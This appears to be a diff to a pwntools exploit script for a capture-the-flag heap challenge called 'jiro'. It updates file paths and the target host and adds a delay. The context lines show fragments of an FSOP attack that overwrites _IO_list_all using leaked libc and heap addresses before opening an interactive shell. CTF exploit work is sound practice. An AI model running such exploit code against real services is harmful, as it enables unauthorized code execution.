@@ -5,15 +5,15 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or './jiro')
-libc = ELF('./libc.so.6')
+exe = context.binary = ELF(args.EXE or './app/jiro')
+libc = ELF('./app/libc.so.6')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
-host = args.HOST or '109.233.56.90'
+host = args.HOST or 'ctfd.cybpaws.su'
 port = int(args.PORT or 11777)
 
 def start_local(argv=[], *a, **kw):
@@ -192,6 +192,8 @@ emp = hire(p64(0x30) + p64(libc_base + libc.sym['_IO_list_all']))
 FSOP_OFFSET = 0x1a70
 edit_employee(aligned_emp, p64(heap_base + FSOP_OFFSET))
 # pause()
+
+sleep(3)
 io.sendline(b'8')
 
 io.interactive()
